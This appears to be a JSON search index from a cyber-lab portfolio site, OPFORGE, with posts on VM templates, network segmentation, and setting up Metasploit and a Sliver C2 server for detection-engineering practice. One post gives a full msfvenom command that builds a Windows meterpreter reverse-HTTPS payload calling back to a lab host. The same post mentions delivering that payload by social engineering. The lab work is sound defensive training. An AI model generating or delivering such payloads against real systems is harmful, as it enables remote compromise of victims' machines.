[{"content":"OPFORGE (Operational Forged Readiness for Generation and Emulation) is a purpose-built cyber lab and portfolio platform developed by H.Y.P.R., a senior cyber warfare operator.\nThis project fuses red team emulation, detection engineering, and AI-driven analytics into a unified range built for realism, scalability, and learning impact.\nüéØ Mission Create a lab environment that demonstrates real-world adversary behavior and detection response ‚Äî with automation, analytics, and operational rigor. OPFORGE is more than just a cyber range: it\u0026rsquo;s a full-stack capability portfolio.\nüß† Why It Matters Modern cyber operations demand more than checklists and tool walkthroughs. OPFORGE showcases:\nSegmented network emulation across red, blue, and cloud environments Detection engineering pipelines powered by Winlogbeat, Zeek, and Logstash AI/ML-enhanced triage through Jupyter, anomaly modeling, and data science Portfolio-grade infrastructure that mirrors real mission environments üß± What\u0026rsquo;s Under the Hood Custom-built virtual lab using VMware Workstation Pro Ubuntu and Windows 10 templates, hardened and cloned pfSense-based segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA Sliver, BloodHound, Impacket, Sysmon, OpenSearch, and more üîÅ Continuously Developed This site documents lab builds, detection strategies, red/blue playbooks, and ML research as the lab matures toward integration with platforms like JHU APL and DOE/NNSA-aligned objectives.\nWant to contribute ideas or follow the project?\nüì¨ Reach out via LinkedIn üìñ Read the latest posts üß™ Explore the detection pipeline ","permalink":"https://opforge.dev/about/","summary":"\u003cp\u003e\u003cstrong\u003eOPFORGE\u003c/strong\u003e (Operational Forged Readiness for Generation and Emulation) is a purpose-built cyber lab and portfolio platform developed by H.Y.P.R., a senior  cyber warfare operator.\u003c/p\u003e\n\u003cp\u003eThis project fuses red team emulation, detection engineering, and AI-driven analytics into a unified range built for realism, scalability, and learning impact.\u003c/p\u003e\n\u003ch2 id=\"-mission\"\u003eüéØ Mission\u003c/h2\u003e\n\u003cp\u003eCreate a lab environment that demonstrates real-world adversary behavior and detection response ‚Äî with automation, analytics, and operational rigor. OPFORGE is more than just a cyber range: it\u0026rsquo;s a full-stack capability portfolio.\u003c/p\u003e","title":"About"},{"content":"Metasploit Installed Metasploit was installed using the official msfinstall script:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall chmod 755 msfinstall sudo ./msfinstall Confirmed with:\nmsfconsole --version Payload Generation The following payload was created for C2 operations within the DMZRED segment:\nsudo msfvenom -p windows/x64/meterpreter/reverse_https \\ LHOST=192.168.22.50 LPORT=8443 \\ -f exe -o shell.exe Payload was moved to:\n/opt/opforge/redteam/payloads/shell.exe File properties:\nfile shell.exe sha256sum shell.exe The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\nNext Steps Set up listener in msfconsole Deploy payload to opf-mbr01 Monitor detection in opf-blue01, opf-ai01, or via Winlogbeat pipeline ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/","summary":"\u003ch2 id=\"metasploit-installed\"\u003eMetasploit Installed\u003c/h2\u003e\n\u003cp\u003eMetasploit was installed using the official \u003ccode\u003emsfinstall\u003c/code\u003e script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echmod \u003cspan style=\"color:#ae81ff\"\u003e755\u003c/span\u003e msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ./msfinstall\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eConfirmed with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emsfconsole --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"payload-generation\"\u003ePayload Generation\u003c/h2\u003e\n\u003cp\u003eThe following payload was created for C2 operations within the DMZRED segment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo msfvenom -p windows/x64/meterpreter/reverse_https \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  LHOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e192.168.22.50 LPORT\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e8443\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -f exe -o shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePayload was moved to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/opt/opforge/redteam/payloads/shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFile properties:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esha256sum shell.exe\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.\u003c/p\u003e","title":"OPF-RED01 Metasploit Setup \u0026 Payload Generation"},{"content":"Sliver Build \u0026amp; Launch After cloning the Sliver repository and resolving build prerequisites (notably zip), the server was compiled successfully using:\ncd /opt/opforge/tools/sliver make The Sliver server was then launched:\n./sliver-server Screenshot of Successful Launch This confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\nNext Steps Launch sliver-client and test C2 communication Generate staged and unstaged payloads Begin Red Team activity with Sliver in DMZRED Monitor OPF-BLUE01/AI01 for correlated events ","permalink":"https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/","summary":"\u003ch2 id=\"sliver-build--launch\"\u003eSliver Build \u0026amp; Launch\u003c/h2\u003e\n\u003cp\u003eAfter cloning the Sliver repository and resolving build prerequisites (notably \u003ccode\u003ezip\u003c/code\u003e), the server was compiled successfully using:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /opt/opforge/tools/sliver\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe Sliver server was then launched:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./sliver-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"screenshot-of-successful-launch\"\u003eScreenshot of Successful Launch\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Sliver Server Launch\" loading=\"lazy\" src=\"/images/posts/sliver-server-launch.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThis confirms the Sliver C2 is operational and ready to receive implants or generate payloads.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"next-steps\"\u003eNext Steps\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLaunch \u003ccode\u003esliver-client\u003c/code\u003e and test C2 communication\u003c/li\u003e\n\u003cli\u003eGenerate staged and unstaged payloads\u003c/li\u003e\n\u003cli\u003eBegin Red Team activity with Sliver in DMZRED\u003c/li\u003e\n\u003cli\u003eMonitor OPF-BLUE01/AI01 for correlated events\u003c/li\u003e\n\u003c/ul\u003e","title":"OPF-RED01 Sliver Server Setup"},{"content":"base-ubuntu-2204-template OS: Ubuntu 22.04 LTS Minimal Uses: Cloning source for opf-red01, opf-log01, opf-ai01, opf-cloud01 Hardened baseline with: UFW firewall SSH key-based auth Git, Python, pip pre-installed Snapshot name: Clean Install ‚Äì Ready for Clone base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Uses: Cloning source for opf-mbr01, future victims Tools installed via Chocolatey: Sysmon, Winlogbeat, VSCode, Wireshark, Sysinternals Pre-Sysprep and snapshot-ready ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-template-builds/","summary":"\u003ch2 id=\"base-ubuntu-2204-template\"\u003ebase-ubuntu-2204-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Ubuntu 22.04 LTS Minimal\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-red01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eHardened baseline with:\n\u003cul\u003e\n\u003cli\u003eUFW firewall\u003c/li\u003e\n\u003cli\u003eSSH key-based auth\u003c/li\u003e\n\u003cli\u003eGit, Python, pip pre-installed\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSnapshot name: \u003ccode\u003eClean Install ‚Äì Ready for Clone\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"base-windows10-template\"\u003ebase-windows10-template\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOS: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003eUses: Cloning source for \u003ccode\u003eopf-mbr01\u003c/code\u003e, future victims\u003c/li\u003e\n\u003cli\u003eTools installed via Chocolatey:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, VSCode, Wireshark, Sysinternals\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePre-Sysprep and snapshot-ready\u003c/li\u003e\n\u003c/ul\u003e","title":"Building Hardened Base Templates for Red, Blue, and AI VMs in OPFORGE"},{"content":"Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-network-design/","summary":"\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"Designing a Segmented Cyber Lab: OPFORGE Network Architecture"},{"content":"OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/","summary":"\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with \u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"From Sandbox to Cyber Range: How OPFORGE Evolved into a Professional Portfolio Lab"},{"content":"üß± Base Templates Used in OPFORGE This post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\nüêß base-ubuntu-2204-template OS: Ubuntu 22.04 LTS (minimal ISO) Usage: Source image for all Linux-based OPFORGE components Configured With: SSH key-based authentication ufw firewall rules Preinstalled: Git, Python3, pip, htop, curl, net-tools Snapshot Label: ubuntu2204-clean-template ü™ü base-windows10-template OS: Windows 10 Pro 22H2 (fully patched) Usage: Source image for domain-joined endpoints Configured With: Tools installed via Install-OPFORGE-WindowsTools.ps1: Sysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark Bloatware removal and telemetry disabled Power settings and Start menu cleaned Snapshot Label: win10_22H2_tools_installed Both templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\n","permalink":"https://opforge.dev/posts/opf-template-notes/","summary":"\u003ch2 id=\"-base-templates-used-in-opforge\"\u003eüß± Base Templates Used in OPFORGE\u003c/h2\u003e\n\u003cp\u003eThis post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"-base-ubuntu-2204-template\"\u003eüêß \u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Ubuntu 22.04 LTS (minimal ISO)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for all Linux-based OPFORGE components\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSSH key-based authentication\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eufw\u003c/code\u003e firewall rules\u003c/li\u003e\n\u003cli\u003ePreinstalled: Git, Python3, pip, htop, curl, net-tools\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003eubuntu2204-clean-template\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"-base-windows10-template\"\u003eü™ü \u003ccode\u003ebase-windows10-template\u003c/code\u003e\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows 10 Pro 22H2 (fully patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsage\u003c/strong\u003e: Source image for domain-joined endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfigured With\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eTools installed via \u003ccode\u003eInstall-OPFORGE-WindowsTools.ps1\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003eSysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eBloatware removal and telemetry disabled\u003c/li\u003e\n\u003cli\u003ePower settings and Start menu cleaned\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSnapshot Label\u003c/strong\u003e: \u003ccode\u003ewin10_22H2_tools_installed\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003eBoth templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.\u003c/p\u003e","title":"OPFORGE Base Template Notes"},{"content":"OPFORGE Infrastructure Overview Overview OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\nEvolution Timeline Phase 1: Initial Sandbox Single VM (SOF-ELK) Flat network, no segmentation Manual log ingestion Phase 2: Tactical Expansion Added pfSense (opf-fw01) Introduced segmentation: CSOCINFRA, DMZRED, LANWORKSTATIONS, ADINFRA First red team emulation with opf-red01 Winlogbeat and Sysmon on endpoints Phase 3: Professionalization Cloned base templates (base-ubuntu-2204-template, base-windows10-template) VM-specific roles: opf-ai01, opf-log01, opf-mbr01, etc. AI and ML integration via Jupyter (opf-ai01) Multi-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch) Lessons Learned Legacy OS images break modern tools Cloning base templates improves consistency Network segmentation is essential for realistic detection engineering ","permalink":"https://opforge.dev/docs/opf-infra/","summary":"\u003ch1 id=\"opforge-infrastructure-overview\"\u003eOPFORGE Infrastructure Overview\u003c/h1\u003e\n\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cp\u003eOPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.\u003c/p\u003e\n\u003ch2 id=\"evolution-timeline\"\u003eEvolution Timeline\u003c/h2\u003e\n\u003ch3 id=\"phase-1-initial-sandbox\"\u003ePhase 1: Initial Sandbox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSingle VM (SOF-ELK)\u003c/li\u003e\n\u003cli\u003eFlat network, no segmentation\u003c/li\u003e\n\u003cli\u003eManual log ingestion\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-2-tactical-expansion\"\u003ePhase 2: Tactical Expansion\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdded pfSense (\u003ccode\u003eopf-fw01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eIntroduced segmentation: \u003ccode\u003eCSOCINFRA\u003c/code\u003e, \u003ccode\u003eDMZRED\u003c/code\u003e, \u003ccode\u003eLANWORKSTATIONS\u003c/code\u003e, \u003ccode\u003eADINFRA\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFirst red team emulation with \u003ccode\u003eopf-red01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWinlogbeat and Sysmon on endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"phase-3-professionalization\"\u003ePhase 3: Professionalization\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCloned base templates (\u003ccode\u003ebase-ubuntu-2204-template\u003c/code\u003e, \u003ccode\u003ebase-windows10-template\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eVM-specific roles: \u003ccode\u003eopf-ai01\u003c/code\u003e, \u003ccode\u003eopf-log01\u003c/code\u003e, \u003ccode\u003eopf-mbr01\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eAI and ML integration via Jupyter (\u003ccode\u003eopf-ai01\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eMulti-tiered ingest pipeline (Zeek ‚Üí Logstash ‚Üí OpenSearch)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lessons-learned\"\u003eLessons Learned\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLegacy OS images break modern tools\u003c/li\u003e\n\u003cli\u003eCloning base templates improves consistency\u003c/li\u003e\n\u003cli\u003eNetwork segmentation is essential for realistic detection engineering\u003c/li\u003e\n\u003c/ul\u003e","title":"OPFORGE Infrastructure Overview"},{"content":"OPFORGE Network Layout Segments CSOCINFRA (192.168.20.0/24): Houses opf-log01 (SIEM) and opf-ai01 (ML detection) LANWORKSTATIONS (192.168.30.0/24): Contains opf-mbr01 and future endpoints DMZRED (192.168.22.0/24): Hosts attacker targets like opf-cloud01 ADINFRA (192.168.40.0/24): Supports opf-dc01 and GPO testing Example Host Assignments Host IP Address Segment opf-fw01 192.168.1.24 (WAN) pfSense router opf-dc01 192.168.40.100 ADINFRA opf-mbr01 192.168.30.101 LANWORKSTATIONS opf-red01 192.168.22.50 DMZRED opf-log01 192.168.20.12 CSOCINFRA ","permalink":"https://opforge.dev/docs/opf-network-layout/","summary":"\u003ch1 id=\"opforge-network-layout\"\u003eOPFORGE Network Layout\u003c/h1\u003e\n\u003ch2 id=\"segments\"\u003eSegments\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCSOCINFRA (192.168.20.0/24)\u003c/strong\u003e: Houses \u003ccode\u003eopf-log01\u003c/code\u003e (SIEM) and \u003ccode\u003eopf-ai01\u003c/code\u003e (ML detection)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLANWORKSTATIONS (192.168.30.0/24)\u003c/strong\u003e: Contains \u003ccode\u003eopf-mbr01\u003c/code\u003e and future endpoints\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDMZRED (192.168.22.0/24)\u003c/strong\u003e: Hosts attacker targets like \u003ccode\u003eopf-cloud01\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eADINFRA (192.168.40.0/24)\u003c/strong\u003e: Supports \u003ccode\u003eopf-dc01\u003c/code\u003e and GPO testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"example-host-assignments\"\u003eExample Host Assignments\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eHost\u003c/th\u003e\n          \u003cth\u003eIP Address\u003c/th\u003e\n          \u003cth\u003eSegment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-fw01\u003c/td\u003e\n          \u003ctd\u003e192.168.1.24 (WAN)\u003c/td\u003e\n          \u003ctd\u003epfSense router\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-dc01\u003c/td\u003e\n          \u003ctd\u003e192.168.40.100\u003c/td\u003e\n          \u003ctd\u003eADINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-mbr01\u003c/td\u003e\n          \u003ctd\u003e192.168.30.101\u003c/td\u003e\n          \u003ctd\u003eLANWORKSTATIONS\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-red01\u003c/td\u003e\n          \u003ctd\u003e192.168.22.50\u003c/td\u003e\n          \u003ctd\u003eDMZRED\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eopf-log01\u003c/td\u003e\n          \u003ctd\u003e192.168.20.12\u003c/td\u003e\n          \u003ctd\u003eCSOCINFRA\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","title":"OPFORGE Network Layout"},{"content":"üîÅ Cloned VMs in the OPFORGE Lab The following VMs are derived from the base templates and customized for their operational roles.\nTemplate Clone Role Description base-ubuntu-2204-template opf-red01 Red Team operator + C2 lab base-ubuntu-2204-template opf-log01 Log ingestion + OpenSearch stack 